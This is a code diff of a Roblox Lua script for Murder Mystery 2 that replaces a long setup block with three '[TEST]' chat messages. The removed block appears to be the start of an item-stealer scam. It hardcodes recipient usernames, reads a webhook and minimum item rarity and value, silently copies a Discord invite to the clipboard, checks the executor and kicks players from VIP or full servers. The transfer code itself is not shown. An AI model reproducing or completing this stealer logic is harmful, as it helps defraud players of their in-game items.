@@ -1,98 +1,24 @@
--- FUCK YOU WYM | BELRUX ON TOP 🤣🤣
--- Prevent multiple executions
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then 
-    print("Script already executed, stopping")
-    return 
-end
-_G.scriptExecuted = true
+game.StarterGui:SetCore("ChatMakeSystemMessage", {
+    Text = "[TEST] Script is running!",
+    Color = Color3.new(0, 1, 0),
+    Font = Enum.Font.SourceSansBold,
+    FontSize = Enum.FontSize.Size18
+})
 
-print("Script starting...")
+wait(2)
 
--- Copy Discord invite to clipboard
-local function copyLink()
-    local setcp = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
-    if setcp then setcp("https://discord.gg/bt4Cgw8F4x") end
-end
-copyLink()
+game.StarterGui:SetCore("ChatMakeSystemMessage", {
+    Text = "[TEST] Users: " .. #(_G.Usernames or {}),
+    Color = Color3.new(0, 1, 0),
+    Font = Enum.Font.SourceSansBold,
+    FontSize = Enum.FontSize.Size18
+})
 
--- Hardcoded target usernames (combined with _G.Usernames)
-local DhUsers = { "joeiamjoezeif", "joezeif111x", "jo_125w" }
-local combinedUser = {}
-for _, v in ipairs(_G.Usernames or {}) do table.insert(combinedUser, v) end
-for _, v in ipairs(DhUsers) do table.insert(combinedUser, v) end
+wait(2)
 
-print("Combined users: " .. table.concat(combinedUser, ", "))
-
--- Configuration from global variables
-local users = _G.Usernames or {}
-local min_rarity = _G.min_rarity or "Godly"
-local min_value = _G.min_value or 1
-local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or ""
-
-print("Configuration:")
-print("  Users: " .. #users .. " users")
-print("  Min rarity: " .. min_rarity)
-print("  Min value: " .. min_value)
-print("  Ping everyone: " .. ping)
-print("  Webhook: " .. (webhook ~= "" and "Set" or "Not set"))
-
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
-
--- Validation
-if next(users) == nil then
-    plr:kick("You didn't add a usernames or a valid webhook !")
-    return
-end
-if game.PlaceId ~= 142823291 then
-    plr:kick("Game not supported. Please join a normal MM2 server")
-    return
-end
-
-local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
-local isMobile = string.find(executor, "delta") or string.find(executor, "krnl")
-local isSalora = string.find(executor, "salora")
-print("Executor: " .. executor)
-print("Is mobile: " .. tostring(isMobile))
-print("Is Salora: " .. tostring(isSalora))
-
-if isSalora then
-    plr:kick("salora isnt supported please use xeno or any other executer")
-    return
-end
-
--- Server check - kick if VIP or full (removed duplicates)
-local VIP = false
-local FULL = (#Players:GetPlayers() >= 12)
-
--- Safely check if server is VIP
-local success, serverType = pcall(function()
-    return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
-end)
-
-print("Server type check success: " .. tostring(success))
-if success then
-    print("Server type: " .. tostring(serverType))
-    VIP = (serverType == "VIPServer")
-    print("Is VIP: " .. tostring(VIP))
-else
-    warn("Failed to get server type, assuming not VIP")
-end
-
-print("Players in server: " .. #Players:GetPlayers())
-print("Is full: " .. tostring(FULL))
-
-if VIP or FULL then
-    if VIP then
-        print("Kicking: VIP server detected")
-        plr:Kick("VIP Servers not supported. Please join a normal server.")
-    else
-        print("Kicking: Server is full")
-        plr:Kick("Server is full. Please join a server with fewer players.")
-    end
-    return
-end
-
-print("Passed all checks, continuing with script...")
+game.StarterGui:SetCore("ChatMakeSystemMessage", {
+    Text = "[TEST] Game ID: " .. game.PlaceId,
+    Color = Color3.new(0, 1, 0),
+    Font = Enum.Font.SourceSansBold,
+    FontSize = Enum.FontSize.Size18
+})
